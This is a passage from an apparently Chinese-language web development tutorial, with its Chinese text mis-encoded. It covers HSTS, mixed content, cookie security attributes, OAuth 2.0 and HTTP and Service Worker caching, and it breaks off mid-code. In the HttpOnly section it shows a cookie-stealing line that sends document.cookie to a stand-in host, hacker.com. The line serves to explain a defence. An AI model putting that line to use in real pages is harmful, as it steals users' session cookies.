class="mermaid">sequenceDiagram    participant ç”¨æˆ·    participant HTTPSç½‘ç«™    participant æ”»å‡»è€…    participant HTTPèµ„æºæœåŠ¡å™¨    ç”¨æˆ·->>HTTPSç½‘ç«™: è®¿é—®https://example.com    HTTPSç½‘ç«™->>ç”¨æˆ·: è¿”å›åŠ å¯†HTML    ç”¨æˆ·->>HTTPèµ„æºæœåŠ¡å™¨: è¯·æ±‚http://cdn.com/script.jsï¼ˆæœªåŠ å¯†ï¼‰    æ”»å‡»è€…->>ç”¨æˆ·: ä¸­é—´äººåŠ«æŒHTTPæµé‡ -> æ³¨å…¥æ¶æ„è„šæœ¬    ç”¨æˆ·->>HTTPSç½‘ç«™: æ‰§è¡Œè¢«ç¯¡æ”¹è„šæœ¬ -> æ•°æ®æ³„éœ²</pre><p>é£é™©ç­‰çº§ï¼š</p><table><thead><tr><th align="left">ç±»å‹</th><th align="left">å±é™©åº¦</th><th align="left">æ¡ˆä¾‹</th><th align="left">æµè§ˆå™¨è¡¨ç°</th></tr></thead><tbody><tr><td align="left">ä¸»åŠ¨æ··åˆå†…å®¹</td><td align="left">â˜…â˜…â˜…</td><td align="left"><code>&lt;script&gt;/&lt;iframe&gt;</code></td><td align="left">é»˜è®¤æ‹¦æˆª</td></tr><tr><td align="left">è¢«åŠ¨æ··åˆå†…å®¹</td><td align="left">â˜…â˜…â˜†</td><td align="left"><code>&lt;img&gt;/&lt;audio&gt;</code></td><td align="left">åŠ è½½ä½†æ˜¾ç¤ºâ€ä¸å®‰å…¨â€è­¦å‘Š</td></tr></tbody></table><p><strong>HSTSï¼ˆHTTPä¸¥æ ¼ä¼ è¾“å®‰å…¨ï¼‰ç­–ç•¥</strong></p><p>æ ¸å¿ƒç›®æ ‡ï¼šå¼ºåˆ¶æµè§ˆå™¨å§‹ç»ˆé€šè¿‡HTTPSè®¿é—®ç½‘ç«™ï¼Œæ¶ˆé™¤HTTPé™çº§æ”»å‡»é£é™©ã€‚</p><p>HSTS å·¥ä½œåŸç†ï¼š</p><pre class="mermaid">sequenceDiagram    participant æµè§ˆå™¨    participant ç½‘ç«™æœåŠ¡å™¨    æµè§ˆå™¨->>ç½‘ç«™æœåŠ¡å™¨: é¦–æ¬¡è®¿é—® https://example.com    ç½‘ç«™æœåŠ¡å™¨->>æµè§ˆå™¨: å“åº”å¤´: Strict-Transport-Security: max-age=31536000    Note right of æµè§ˆå™¨: æœ¬åœ°HSTSç¼“å­˜ç”Ÿæ•ˆ    æµè§ˆå™¨->>ç½‘ç«™æœåŠ¡å™¨: åç»­æ‰€æœ‰è¯·æ±‚è‡ªåŠ¨HTTPSï¼ˆå³ä½¿è¾“å…¥http://ï¼‰</pre><p>å…³é”®å“åº”å¤´æŒ‡ä»¤ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Strict-Transport-Security</span><span class="hljs-punctuation">: </span><br>  max-age=31536000;           // æœ‰æ•ˆæœŸ1å¹´ï¼ˆç§’ï¼‰<br>  includeSubDomains;          // ä¿æŠ¤æ‰€æœ‰å­åŸŸå<br>  preload                    // ç”³è¯·åŠ å…¥æµè§ˆå™¨é¢„åŠ è½½åˆ—è¡¨<br></code></pre></td></tr></table></figure><p>é˜²å¾¡æ•ˆæœå¯¹æ¯”:</p><table><thead><tr><th align="left">æ”»å‡»ç±»å‹</th><th align="left">æ— é˜²æŠ¤</th><th align="left">HSTSå¯ç”¨å</th></tr></thead><tbody><tr><td align="left">SSLå‰¥ç¦»æ”»å‡»</td><td align="left">âŒ å¯èƒ½é™çº§åˆ°HTTP</td><td align="left">âœ”ï¸ å¼ºåˆ¶HTTPSè¿æ¥</td></tr><tr><td align="left">æ··åˆå†…å®¹æ³¨å…¥</td><td align="left">âŒ å¯åŠ«æŒHTTPèµ„æº</td><td align="left">âœ”ï¸ è‡ªåŠ¨å‡çº§èµ„æºè¯·æ±‚</td></tr><tr><td align="left">CookieåŠ«æŒ</td><td align="left">âŒ æ˜æ–‡ä¼ è¾“Cookie</td><td align="left">âœ”ï¸ å…¨ç¨‹åŠ å¯†</td></tr></tbody></table><p><strong>å…³é”®æ³¨æ„äº‹é¡¹</strong></p><ul><li>å›é€€é£é™©ï¼š<ul><li>å¯ç”¨HSTSåè‹¥å…³é—­HTTPS â†’ ç”¨æˆ·æ— æ³•è®¿é—®ç½‘ç«™ï¼ˆç›´åˆ°max-ageè¿‡æœŸï¼‰</li><li>è§£å†³æ–¹æ¡ˆï¼šéƒ¨ç½²æ—¶å…ˆè®¾ç½®è¾ƒçŸ­max-ageï¼ˆå¦‚1å°æ—¶ï¼‰</li></ul></li><li>é¦–æ¬¡è®¿é—®æ¼æ´ï¼š<ul><li>ç”¨æˆ·é¦–æ¬¡è®¿é—®<code>http://</code>æ—¶ä»å¯èƒ½è¢«åŠ«æŒ</li><li>ç»ˆææ–¹æ¡ˆï¼šç”³è¯·æµè§ˆå™¨HSTSé¢„åŠ è½½åˆ—è¡¨ï¼ˆChrome&#x2F;Firefoxå†…ç½®ï¼‰</li></ul></li><li>æµ‹è¯•ç¯å¢ƒè§„é¿:</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># å¼€å‘ç¯å¢ƒç¦ç”¨HSTS</span><br><span class="hljs-attribute">add_header</span> Strict-Transport-Security <span class="hljs-string">&quot;max-age=0;&quot;</span>;<br></code></pre></td></tr></table></figure><p><strong>å®Œæ•´å®‰å…¨é…ç½®ç¤ºä¾‹</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>  <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<br>  <span class="hljs-attribute">server_name</span> example.com;<br><br>  <span class="hljs-comment"># TLSé…ç½®</span><br>  <span class="hljs-attribute">ssl_certificate</span> /path/to/cert.pem;<br>  <span class="hljs-attribute">ssl_certificate_key</span> /path/to/key.pem;<br>  <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;<br><br>  <span class="hljs-comment"># HSTSé…ç½®ï¼ˆç”Ÿäº§ç¯å¢ƒï¼‰</span><br>  <span class="hljs-attribute">add_header</span> Strict-Transport-Security <span class="hljs-string">&quot;max-age=31536000; includeSubDomains; preload&quot;</span>;<br><br>  <span class="hljs-comment"># æ··åˆå†…å®¹å‡çº§</span><br>  <span class="hljs-attribute">add_header</span> Content-Security-Policy <span class="hljs-string">&quot;upgrade-insecure-requests&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>upgrade-insecure-requestsï¼šè‡ªåŠ¨å°†HTTPèµ„æºå‡çº§ä¸ºHTTPSè¯·æ±‚</p></blockquote><h2 id="3-2-å®‰å…¨å®è·µ"><a href="#3-2-å®‰å…¨å®è·µ" class="headerlink" title="3.2 å®‰å…¨å®è·µ"></a>3.2 å®‰å…¨å®è·µ</h2><h3 id="Cookie-å®‰å…¨å±æ€§ï¼ˆSecure-HttpOnly-SameSiteï¼‰"><a href="#Cookie-å®‰å…¨å±æ€§ï¼ˆSecure-HttpOnly-SameSiteï¼‰" class="headerlink" title="Cookie å®‰å…¨å±æ€§ï¼ˆSecure&#x2F;HttpOnly&#x2F;SameSiteï¼‰"></a>Cookie å®‰å…¨å±æ€§ï¼ˆSecure&#x2F;HttpOnly&#x2F;SameSiteï¼‰</h3><p><strong>Secure å±æ€§</strong></p><p>ä½œç”¨ï¼šç¡®ä¿Cookieä»…é€šè¿‡HTTPSåŠ å¯†è¿æ¥ä¼ è¾“ï¼Œé˜²æ­¢ä¸­é—´äººçªƒå¬ã€‚</p><p>é…ç½®æ–¹å¼ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>sessionId=abc123; Secure;  <br></code></pre></td></tr></table></figure><p>å®‰å…¨å½±å“ï¼š</p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">æ— Secure</th><th align="left">å¯ç”¨Secure</th></tr></thead><tbody><tr><td align="left">HTTPæ˜æ–‡è¯·æ±‚</td><td align="left">Cookieæ˜æ–‡ä¼ è¾“ âŒ</td><td align="left">ä¸å‘é€Cookie âœ”ï¸</td></tr><tr><td align="left">HTTPSåŠ å¯†è¯·æ±‚</td><td align="left">æ­£å¸¸å‘é€ âœ”ï¸</td><td align="left">æ­£å¸¸å‘é€ âœ”ï¸</td></tr></tbody></table><blockquote><p>å¿…é¡»é¡¹ï¼šä»»ä½•åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼ˆå¦‚ä¼šè¯IDï¼‰çš„Cookieå¿…é¡»è®¾ç½®Secureã€‚</p></blockquote><p><strong>HttpOnly å±æ€§</strong></p><p>ä½œç”¨ï¼šé˜»æ­¢JavaScripté€šè¿‡document.cookieè®¿é—®Cookieï¼Œé˜²èŒƒXSSæ”»å‡»çªƒå–ã€‚</p><p>é…ç½®æ–¹å¼ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>sessionId=abc123; HttpOnly;  <br></code></pre></td></tr></table></figure><p>å®‰å…¨å½±å“ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ¶æ„è„šæœ¬å°è¯•çªƒå–Cookie</span><br><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://hacker.com?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>); <br><br><span class="hljs-comment">// ç»“æœï¼š</span><br><span class="hljs-comment">//   âŒ æ— HttpOnlyï¼šæˆåŠŸçªƒå–ä¼šè¯ID</span><br><span class="hljs-comment">//   âœ”ï¸ æœ‰HttpOnlyï¼šdocument.cookieæ— æ³•è¯»å–è¯¥Cookie</span><br></code></pre></td></tr></table></figure><blockquote><p>æœ€ä½³å®è·µï¼šèº«ä»½éªŒè¯ç±»Cookieå¿…é¡»å¯ç”¨HttpOnlyã€‚</p></blockquote><p><strong>SameSite å±æ€§</strong></p><p>ä½œç”¨ï¼šæ§åˆ¶Cookieåœ¨è·¨ç«™è¯·æ±‚ä¸­æ˜¯å¦å‘é€ï¼Œé˜²å¾¡CSRFæ”»å‡»ã€‚</p><p>é…ç½®å€¼ï¼š</p><table><thead><tr><th align="left">å±æ€§å€¼</th><th align="left">è·¨ç«™è¯·æ±‚å‘é€è§„åˆ™</th><th align="left">é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td align="left">Strict</td><td align="left">å®Œå…¨ç¦æ­¢è·¨ç«™å‘é€</td><td align="left">é“¶è¡Œæ“ä½œç­‰é«˜æ•æ„Ÿåœºæ™¯</td></tr><tr><td align="left">Lax</td><td align="left">ä»…å…è®¸å¯¼èˆªè·³è½¬ï¼ˆ<code>&lt;a&gt;</code>é“¾æ¥ï¼‰</td><td align="left">é»˜è®¤æ¨èå€¼</td></tr><tr><td align="left">None</td><td align="left">å…è®¸è·¨ç«™å‘é€ï¼ˆéœ€åŒæ—¶è®¾ç½®Secureï¼‰</td><td align="left">è·¨åŸŸå•ç‚¹ç™»å½•(SSO)</td></tr></tbody></table><p>é…ç½®æ–¹å¼ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span>sessionId=abc123; SameSite=Lax;  <br></code></pre></td></tr></table></figure><p>è·¨ç«™è¯·æ±‚åœºæ™¯å¯¹æ¯”ï¼š</p><table><thead><tr><th align="left">è¯·æ±‚ç±»å‹</th><th align="left">SameSite&#x3D;Strict</th><th align="left">SameSite&#x3D;Lax</th><th align="left">SameSite&#x3D;None</th></tr></thead><tbody><tr><td align="left">ç›´æ¥åœ°å€æ è¾“å…¥</td><td align="left">âœ”ï¸</td><td align="left">âœ”ï¸</td><td align="left">âœ”ï¸</td></tr><tr><td align="left"><code>&lt;a href&gt;</code>è·³è½¬</td><td align="left">âŒ</td><td align="left">âœ”ï¸</td><td align="left">âœ”ï¸</td></tr><tr><td align="left"><code>&lt;form&gt;</code>è¡¨å•æäº¤</td><td align="left">âŒ</td><td align="left">âŒ</td><td align="left">âœ”ï¸</td></tr><tr><td align="left">AJAXè·¨åŸŸè¯·æ±‚</td><td align="left">âŒ</td><td align="left">âŒ</td><td align="left">âœ”ï¸</td></tr></tbody></table><p><strong>ç»¼åˆé˜²å¾¡é…ç½®ç¤ºä¾‹</strong></p><p>(1) å®‰å…¨ä¼šè¯ Cookie è®¾ç½®</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span><br>  sessionId=abc123; <br>  Secure;          // ä»…HTTPSä¼ è¾“<br>  HttpOnly;        // é˜»æ­¢JSè®¿é—®<br>  SameSite=Lax;    // é˜²å¾¡CSRF<br>  Path=/;          // ä½œç”¨è·¯å¾„<br>  Max-Age=3600;    // æœ‰æ•ˆæœŸï¼ˆç§’ï¼‰<br></code></pre></td></tr></table></figure><p>(2) è·¨åŸŸè®¤è¯ Cookieï¼ˆOAuthï¼‰</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Set-Cookie</span><span class="hljs-punctuation">: </span><br>  oauth_token=xyz789; <br>  Secure; <br>  HttpOnly; <br>  SameSite=None;   // å…è®¸è·¨ç«™å‘é€<br></code></pre></td></tr></table></figure><h3 id="OAuth-2-0æˆæƒæµç¨‹"><a href="#OAuth-2-0æˆæƒæµç¨‹" class="headerlink" title="OAuth 2.0æˆæƒæµç¨‹"></a>OAuth 2.0æˆæƒæµç¨‹</h3><pre class="mermaid">sequenceDiagram    participant User as èµ„æºæ‰€æœ‰è€… (ç”¨æˆ·)    participant Client as å®¢æˆ·ç«¯ (ç¬¬ä¸‰æ–¹åº”ç”¨)    participant AuthServer as æˆæƒæœåŠ¡å™¨ (å¦‚Google/Facebook)    participant ResourceServer as èµ„æºæœåŠ¡å™¨ (APIæœåŠ¡)    Note over User,Client: å‰ç½®æ¡ä»¶ï¼šå®¢æˆ·ç«¯å·²åœ¨æˆæƒæœåŠ¡å™¨æ³¨å†Œ<br>è·å¾—client_idå’Œclient_secret    User->>Client: 1. ç‚¹å‡»"ä½¿ç”¨XXè´¦å·ç™»å½•"    Client->>AuthServer: 2. é‡å®šå‘åˆ°æˆæƒç«¯ç‚¹<br>?response_type=code<br>&client_id=CLIENT_ID<br>&redirect_uri=CALLBACK_URL<br>&scope=email profile<br>&state=RANDOM_STRING    AuthServer->>User: 3. æ˜¾ç¤ºç™»å½•/æˆæƒé¡µé¢    User->>AuthServer: 4. è¾“å…¥å‡­è¯å¹¶æˆæƒ    AuthServer->>Client: 5. é‡å®šå‘åˆ°callback_uri<br>?code=AUTHORIZATION_CODE<br>&state=RANDOM_STRING    Client->>AuthServer: 6. POSTä»¤ç‰Œè¯·æ±‚<br>grant_type=authorization_code<br>&code=AUTHORIZATION_CODE<br>&redirect_uri=CALLBACK_URL<br>&client_id=CLIENT_ID<br>&client_secret=CLIENT_SECRET    AuthServer->>Client: 7. è¿”å›è®¿é—®ä»¤ç‰Œ<br>{access_token: "xxx",<br>token_type: "bearer",<br>expires_in: 3600,<br>refresh_token: "yyy"}    Client->>ResourceServer: 8. æºå¸¦ä»¤ç‰Œè¯·æ±‚èµ„æº<br>Authorization: Bearer xxx    ResourceServer->>Client: 9. è¿”å›å—ä¿æŠ¤èµ„æº</pre><h1 id="å››ã€æ€§èƒ½ä¼˜åŒ–"><a href="#å››ã€æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="å››ã€æ€§èƒ½ä¼˜åŒ–"></a>å››ã€æ€§èƒ½ä¼˜åŒ–</h1><h2 id="4-1-ç¼“å­˜ç­–ç•¥"><a href="#4-1-ç¼“å­˜ç­–ç•¥" class="headerlink" title="4.1 ç¼“å­˜ç­–ç•¥"></a>4.1 ç¼“å­˜ç­–ç•¥</h2><h3 id="å¼ºç¼“å­˜ï¼ˆCache-Control-Expiresï¼‰ä¸åå•†ç¼“å­˜ï¼ˆETag-Last-Modifiedï¼‰"><a href="#å¼ºç¼“å­˜ï¼ˆCache-Control-Expiresï¼‰ä¸åå•†ç¼“å­˜ï¼ˆETag-Last-Modifiedï¼‰" class="headerlink" title="å¼ºç¼“å­˜ï¼ˆCache-Control&#x2F;Expiresï¼‰ä¸åå•†ç¼“å­˜ï¼ˆETag&#x2F;Last-Modifiedï¼‰"></a>å¼ºç¼“å­˜ï¼ˆCache-Control&#x2F;Expiresï¼‰ä¸åå•†ç¼“å­˜ï¼ˆETag&#x2F;Last-Modifiedï¼‰</h3><p><strong>å¼ºç¼“å­˜ï¼ˆæœ¬åœ°ç¼“å­˜ï¼‰</strong></p><p>æµè§ˆå™¨ä¸å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜èµ„æºã€‚</p><p>æ ¸å¿ƒå“åº”å¤´ï¼š</p><table><thead><tr><th align="left">å“åº”å¤´</th><th align="left">ä¼˜å…ˆçº§</th><th align="left">å€¼æ ¼å¼</th><th align="left">ç¤ºä¾‹</th><th align="left">ç‰¹æ€§è¯´æ˜</th></tr></thead><tbody><tr><td align="left">Cache-Control</td><td align="left">é«˜</td><td align="left">æŒ‡ä»¤ç»„åˆ</td><td align="left">max-age&#x3D;3600, public</td><td align="left">HTTP&#x2F;1.1æ ‡å‡†ï¼Œç²¾ç¡®æ§åˆ¶ç¼“å­˜</td></tr><tr><td align="left">Expires</td><td align="left">ä½</td><td align="left">GMTæ—¶é—´æˆ³</td><td align="left">Expires: Wed, 21 Oct 2025 07:28:00 GMT</td><td align="left">HTTP&#x2F;1.0é—ç•™ï¼Œå­˜åœ¨æ—¶åŒºé—®é¢˜</td></tr></tbody></table><p>å¸¸è§æŒ‡ä»¤ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span><br>  max-age=3600,          // ç¼“å­˜æœ‰æ•ˆæœŸï¼ˆç§’ï¼‰<br>  public,               // å…è®¸ä»£ç†/CDNç¼“å­˜<br>  immutable,            // èµ„æºæ°¸ä¸æ›´æ–°ï¼ˆé€‚ç”¨äºç‰ˆæœ¬åŒ–æ–‡ä»¶ï¼‰<br>  no-store,             // ç¦æ­¢ç¼“å­˜ï¼ˆæœ€é«˜ä¼˜å…ˆçº§ï¼‰<br>  no-cache              // éœ€åå•†éªŒè¯ï¼ˆéå­—é¢æ„æ€ï¼‰<br></code></pre></td></tr></table></figure><p>å·¥ä½œæµç¨‹ï¼š</p><pre class="mermaid">graph LR  A[æµè§ˆå™¨è¯·æ±‚èµ„æº] --> B{æœ¬åœ°ç¼“å­˜æ˜¯å¦æœ‰æ•ˆ?}  B -->|Cache-Controlæœ‰æ•ˆ| C[ç›´æ¥ä½¿ç”¨ç¼“å­˜]  B -->|ç¼“å­˜å¤±æ•ˆ| D[å‘èµ·ç½‘ç»œè¯·æ±‚]</pre><p><strong>åå•†ç¼“å­˜ï¼ˆæ¡ä»¶è¯·æ±‚ï¼‰</strong></p><p>æµè§ˆå™¨æºå¸¦éªŒè¯ä¿¡æ¯è¯·æ±‚æœåŠ¡å™¨ï¼Œç”±æœåŠ¡å™¨å†³å®šæ˜¯å¦è¿”å›èµ„æºï¼ˆ304å¤ç”¨ç¼“å­˜ï¼‰ã€‚</p><p>æ ¸å¿ƒå¤´å¯¹ï¼š</p><table><thead><tr><th align="left">å“åº”å¤´</th><th align="left">è¯·æ±‚å¤´</th><th align="left">éªŒè¯åŸç†</th><th align="left">ä¼˜å…ˆçº§</th></tr></thead><tbody><tr><td align="left">ETag</td><td align="left">If-None-Match</td><td align="left">èµ„æºå†…å®¹å“ˆå¸Œå€¼ï¼ˆå¦‚â€d53jk-â€œï¼‰</td><td align="left">é«˜</td></tr><tr><td align="left">Last-Modified</td><td align="left">If-Modified-Since</td><td align="left">æœ€åä¿®æ”¹æ—¶é—´æˆ³</td><td align="left">ä½</td></tr></tbody></table><p>å·¥ä½œæµç¨‹ï¼š</p><pre class="mermaid">sequenceDiagram    participant Browser    participant Server    Browser->>Server: é¦–æ¬¡è¯·æ±‚ /style.css    Server->>Browser: è¿”å›èµ„æº + ETag: W/"d53jk-"    Browser->>Server: äºŒæ¬¡è¯·æ±‚ï¼ˆæºå¸¦ If-None-Match: W/"d53jk-"ï¼‰    alt èµ„æºæœªä¿®æ”¹        Server->>Browser: 304 Not Modifiedï¼ˆç©ºbodyï¼‰        Browser->>Browser: ä½¿ç”¨ç¼“å­˜    else èµ„æºå·²æ›´æ–°        Server->>Browser: 200 OK + æ–°èµ„æº    end</pre><p><strong>å¯¹æ¯”ä¸é€‰å‹æŒ‡å—</strong></p><table><thead><tr><th align="left">ç‰¹æ€§</th><th align="left">å¼ºç¼“å­˜</th><th align="left">åå•†ç¼“å­˜</th></tr></thead><tbody><tr><td align="left">ç½‘ç»œè¯·æ±‚</td><td align="left">æ— è¯·æ±‚</td><td align="left">æœ‰è¯·æ±‚ï¼ˆ304å“åº”ï¼‰</td></tr><tr><td align="left">å¸¦å®½æ¶ˆè€—</td><td align="left">0</td><td align="left">å°ï¼ˆä»…å¤´éƒ¨ä¼ è¾“ï¼‰</td></tr><tr><td align="left">æ›´æ–°çµæ•åº¦</td><td align="left">ä¾èµ–max-ageè®¾ç½®</td><td align="left">å³æ—¶æ›´æ–°</td></tr><tr><td align="left">é€‚ç”¨èµ„æº</td><td align="left">é™æ€èµ„æºï¼ˆJS&#x2F;CSS&#x2F;å›¾ç‰‡ç‰ˆæœ¬åŒ–ï¼‰</td><td align="left">åŠ¨æ€å†…å®¹ï¼ˆä¸ªæ€§åŒ–APIæ•°æ®ï¼‰</td></tr><tr><td align="left">å…¸å‹é…ç½®</td><td align="left">Cache-Control: max-age&#x3D;31536000, immutable</td><td align="left">Cache-Control: no-cache + ETag</td></tr></tbody></table><p><strong>æœ€ä½³å®è·µé…ç½®</strong></p><p>(1) é™æ€èµ„æºï¼ˆå¼ºç¼“å­˜ï¼‰</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /static/ &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;public, max-age=31536000, immutable&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) åŠ¨æ€ APIï¼ˆåå•†ç¼“å­˜ï¼‰</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /api/ &#123;<br>  <span class="hljs-attribute">add_header</span> Cache-Control <span class="hljs-string">&quot;no-cache&quot;</span>;<br>  <span class="hljs-attribute">etag</span> <span class="hljs-literal">on</span>;  <span class="hljs-comment"># å¯ç”¨ETag</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(3) æ··åˆç­–ç•¥</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=600, must-revalidate<br></code></pre></td></tr></table></figure><blockquote><p>600ç§’å†…å¼ºç¼“å­˜ â†’ è¿‡æœŸåå¿…é¡»éªŒè¯ï¼ˆè½¬ä¸ºåå•†ç¼“å­˜ï¼‰</p></blockquote><p><strong>æµè§ˆå™¨è¡Œä¸ºéªŒè¯</strong></p><ul><li>å¼ºç¼“å­˜ç”Ÿæ•ˆï¼šChrome DevTools â†’ Network â†’ Sizeåˆ—æ˜¾ç¤º (memory cache)</li><li>åå•†ç¼“å­˜ç”Ÿæ•ˆï¼š<ul><li>å“åº”çŠ¶æ€ç  304</li><li>Headersä¸­çš„ ETag&#x2F;Last-Modified ä¸è¯·æ±‚å¤´åŒ¹é…</li></ul></li></ul><p><strong>ç¼“å­˜å±‚çº§å†³ç­–ç­–ç•¥</strong></p><pre class="mermaid">graph TD  A[èµ„æºç±»å‹] --> B{æ˜¯å¦ç‰ˆæœ¬åŒ–?}  B -->|æ˜¯| C[å¼ºç¼“å­˜: max-age=1å¹´+immutable]  B -->|å¦| D{æ›´æ–°é¢‘ç‡?}  D -->|é«˜é¢‘æ›´æ–°| E[åå•†ç¼“å­˜: no-cache+ETag]  D -->|ä½é¢‘æ›´æ–°| F[å¼ºç¼“å­˜: max-age=1å°æ—¶]</pre><h3 id="Service-Workerç¦»çº¿ç¼“å­˜"><a href="#Service-Workerç¦»çº¿ç¼“å­˜" class="headerlink" title="Service Workerç¦»çº¿ç¼“å­˜"></a>Service Workerç¦»çº¿ç¼“å­˜</h3><p><strong>æ ¸å¿ƒåŸç†</strong></p><p>Service Worker æ˜¯æµè§ˆå™¨ç‹¬ç«‹äºç½‘é¡µè¿è¡Œçš„è„šæœ¬ï¼Œä½œä¸ºç½‘ç»œè¯·æ±‚çš„å¯ç¼–ç¨‹ä»£ç†ï¼Œé€šè¿‡æ‹¦æˆªè¯·æ±‚å®ç°ç¦»çº¿ç¼“å­˜æ§åˆ¶ã€‚</p><pre class="mermaid">graph LR  A[ç½‘é¡µè¯·æ±‚] --> B{Service Worker}  B -->|å‘½ä¸­ç¼“å­˜| C[è¿”å›ç¼“å­˜]  B -->|æœªå‘½ä¸­| D[è½¬å‘è¯·æ±‚ -> ç½‘ç»œ]  D --> E[ç¼“å­˜æ–°èµ„æº]</pre><p><strong>å…³é”®å®ç°æ­¥éª¤</strong></p><p>(1) æ³¨å†Œä¸å®‰è£…</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ä¸»çº¿ç¨‹æ³¨å†Œ</span><br><span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;serviceWorker&#x27;</span> <span class="hljs-keyword">in</span> navigator) &#123;<br>  navigator.<span class="hljs-property">serviceWorker</span>.<span class="hljs-title function_">register</span>(<span class="hljs-string">&#x27;/sw.js&#x27;</span>, &#123; <span class="hljs-attr">scope</span>: <span class="hljs-string">&#x27;/&#x27;</span> &#125;)<br>    .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">reg</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;SWæ³¨å†ŒæˆåŠŸ&#x27;</span>))<br>    .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&#x27;SWæ³¨å†Œå¤±è´¥&#x27;</span>, err));<br>&#125;<br></code></pre></td></tr></table></figure><p>sw.js - å®‰è£…é˜¶æ®µï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_NAME</span> = <span class="hljs-string">&#x27;v1-static&#x27;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PRE_CACHE_URLS</span> = [  <span class="hljs-comment">// é¢„ç¼“å­˜åˆ—è¡¨</span><br>  <span class="hljs-string">&#x27;/&#x27;</span>,<br>  <span class="hljs-string">&#x27;/index.html&#x27;</span>,<br>  <span class="hljs-string">&#x27;/styles.css&#x27;</span>,<br>  <span class="hljs-string">&#x27;/app.js&#x27;</span><br>];<br><br>self.<span 